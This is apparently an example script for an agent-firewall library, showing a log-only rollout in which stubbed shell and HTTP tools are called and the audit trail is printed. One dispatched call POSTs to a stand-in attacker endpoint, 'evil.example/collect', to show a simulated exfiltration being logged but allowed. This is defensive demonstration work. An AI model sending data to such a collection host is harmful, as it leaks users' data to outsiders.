"""Show a low-friction log-only rollout using the generic preview path."""

from __future__ import annotations

import io
import subprocess

from agentfirewall import ConsoleAuditSink, FirewallConfig, InMemoryAuditSink, MultiAuditSink
from agentfirewall.generic import create_generic_runtime_bundle
from agentfirewall.policy_packs import named_policy_pack


def _fake_shell_runner(command, *, shell=False, cwd=None, **kwargs):
    return subprocess.CompletedProcess(
        args=command,
        returncode=0,
        stdout="repo files\n",
    )


def _fake_http_opener(request, **kwargs):
    return io.BytesIO(b'{"status":"ok"}')


def main() -> None:
    memory = InMemoryAuditSink()
    policy_pack = named_policy_pack("default", trusted_hosts=("api.openai.com",))
    bundle = create_generic_runtime_bundle(
        config=FirewallConfig(name="log-only-demo", log_only=True),
        policy_pack=policy_pack,
        audit_sink=MultiAuditSink([memory, ConsoleAuditSink()]),
        runner=_fake_shell_runner,
        http_opener=_fake_http_opener,
        tool_call_id_factory=lambda name, args, kwargs: f"call_log_only_{name}",
    )

    bundle.register_tool("status", lambda message: f"status:{message}")
    bundle.register_tool(
        "shell",
        lambda command: bundle.command_runner.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
        ).stdout.strip(),
    )
    bundle.register_tool(
        "http_request",
        lambda url, method="GET": bundle.http_client.request(url, method=method).read(),
    )

    print("== AgentFirewall log-only rollout ==")
    print("mode: log_only=True")
    print("shared policy: default")
    print("trusted_hosts: ('api.openai.com',)")
    print()
    print(f"status -> {bundle.dispatch('status', message='ready')}")
    print(f"shell -> {bundle.dispatch('shell', command='ls')}")
    bundle.dispatch("http_request", url="https://evil.example/collect", method="POST")
    print("http_request -> allowed to continue because log-only keeps the workflow live")
    print()
    print("== key audit fields ==")
    for entry in memory.entries:
        item = entry.to_trace_dict()
        original = item["decision_metadata"].get("original_action", "-")
        if item["event_kind"] == "tool_call":
            tool_name = entry.event.payload.get("name", "-")
        else:
            tool_name = item["runtime_context"].get("tool_name") or "-"
        print(
            f"{item['event_kind']:<12} action={item['action']:<5} "
            f"original={original:<6} tool={tool_name:<12} rule={item['rule']}"
        )


if __name__ == "__main__":
    main()
